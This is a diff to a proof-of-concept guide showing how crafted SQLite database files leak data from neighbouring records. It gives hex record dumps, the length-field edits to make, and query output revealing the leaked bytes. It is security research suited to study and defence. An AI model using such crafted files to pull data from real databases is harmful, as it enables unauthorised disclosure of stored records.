@@ -1,33 +1,32 @@
 # Record Leaking
 
-So this is a POC guide for a cool trick I found in sqlite. it's a bit niche, however it does have some imaginable applications. Effectively using maliciously crafted records, you can leak subsequent records. This was done in sqlite3 version `3.35.1`, which at the time of this writing, is the latest version (in case you don't believe me):
+So this is a POC guide for a cool trick I found in sqlite. it's a bit niche, however it does have some imaginable applications. Effectively using maliciously crafted records, you can leak subsequent records. This was done in sqlite3 version `3.37.0` and `3.35.1` (the `3.35.1` example is documented in the `old_version` directory), which at the time of this writing, is the latest version (in case you don't believe me):
 
 ```
-$    ./sqlite3
-SQLite version 3.35.1 2021-03-15 16:53:57
-Enter ".help" for usage hints.
+$	./sqlite3 -version
+3.37.0 2021-11-27 14:13:22 bd41822c7424d393a30e92ff6cb254d25c26769889c1499a18a0b9339f5d6c8a
 ```
 
 There will be a brief explanation, followed by two examples of this. For the examples, check in the `examples` file for the db files, along with the executable.
 
 ## Explanation
 
-So sqlite is using a paging mechanism in order to handle it's memory. There is some custom memory allocation functionality for dealing with this. The database files that save the database are just straight memory pages. As such, this attack revolves around overwriting particular values in the database file, so when we query one record, it will leak data past the record. This is why it's a bit of a niche attack. However it can still have some applications, such as providing a new way to exfil data from the perspective of a client querying a database, or maybe if you're trying to access data that is only in memory (I haven't reversed out the in memory functionality, so not too sure on the feasibility of that), or any number of weird circumstances.
+So sqlite is using a paging mechanism in order to handle it's memory. There is some custom memory allocation functionality for dealing with this. The database files that save the database are just straight memory pages. As such, this attack revolves around overwriting particular values in the database file, so when we query one record, it will leak data past the record. This is why it's a bit of a niche attack. However it can still have some applications, where you want to leak records in memory (could be helpful if you want to leak records that have been created, yet not written to the file).
 
-I'll release more docs about how exactly the internal memory layout and some other functionalities work, but this is the gist. For records that store strings, they store a value which represents the size of the string. When a record goes to read a string, it looks at that size and takes its word for it. We will just overwrite that value with a larger value. This will expand the string, and can either move it or other columns into subsequent records. We will also expand the size of the record itself to match it. This is to pass a series of checks it does, to hopefully prevent shenanigans like this. Then when we query that record, we will also get data from proceeding records.
+I'll release more docs about how exactly the internal memory layout and some other functionalities work (which can be found here: https://github.com/guyinatuxedo/sqlite3Docs), but this is the gist. For records that store strings, they store a value which represents the size of the string. When a record goes to read a string, it looks at that size and takes its word for it. We will just overwrite that value with a larger value. This will expand the string, and can either move it or other columns into subsequent records. We will also expand the size of the record itself to match it. This is to pass a series of checks it does, to hopefully prevent shenanigans like this. Then when we query that record, we will also get data from proceeding records.
 
 ## Example 0
 
-This is going to be a simple example where we just leak 1 byte from the next record's metadata. This is the table we will be working with:
+This is going to be a simple example where we just leak 1 byte from the next record's metadata. This is the table we will be working with, with these records:
 
 ```
 sqlite> CREATE TABLE x (y varchar(100), z int);
-```
-
-With these records:
-
-```
-sqlite> select * from x;
+sqlite> INSERT INTO x VALUES ("15935728", 100);
+sqlite> INSERT INTO x VALUES ("15935728", 200);
+sqlite> INSERT INTO x VALUES ("75395128", 300);
+sqlite> INSERT INTO x VALUES ("15935728", 400);
+sqlite> INSERT INTO x VALUES ("15935728", 500);
+sqlite> SELECT * FROM x;
 15935728|100
 15935728|200
 75395128|300
@@ -41,11 +40,17 @@ Now for this, we will edit the record with the `75395128`. Currently, it has the
 0D 03 03 1D 02 37 35 33 39 35 31 32 38 01 2C
 ```
 
+With the next record having these bytes:
+```
+0D 02 03 1D 02 31 35 39 33 35 37 32 38 00 C8
+```
+
 Which have these specific values:
 
 ```
 Record Length: 0x0D (13 bytes)
 Length of String: 0x08 (((0x1D - 12) / 2), check other pages for explanation)
+Integer Value Z : 0x012c (300)
 ```
 
 We will change these values to be this:
@@ -64,7 +69,8 @@ Which becomes these bytes. So effectively we just extended the string length by 
 Now the records look like this:
 
 ```
-sqlite> select * from x;
+sqlite> .open ex0_corrupted
+sqlite> SELECT * FROM x;
 15935728|100
 15935728|200
 75395128|11277
@@ -91,7 +97,14 @@ sqlite> CREATE TABLE x (y varchar(100));
 
 With these records:
 ```
-sqlite> select * from x;
+sqlite> .open ex1
+sqlite> CREATE TABLE x (y varchar(100));
+sqlite> INSERT INTO x VALUES ("15935728");
+sqlite> INSERT INTO x VALUES ("15935728");
+sqlite> INSERT INTO x VALUES ("75395128");
+sqlite> INSERT INTO x VALUES ("15935728");
+sqlite> INSERT INTO x VALUES ("15935728");
+sqlite> SELECT * FROM x;
 15935728
 15935728
 75395128
@@ -117,7 +130,8 @@ Now for this, we are simply going to extend the length of the string column, int
 Now one thing to note, there is a newline character `0x0A` in between them. As such, we should also leak a newline. And when we try running a query, we see that we are getting a record leak:
 
 ```
-sqlite> select * from x;
+sqlite> .open ex1_corrupted
+sqlite> SELECT * FROM x;
 15935728
 15935728
 75395128
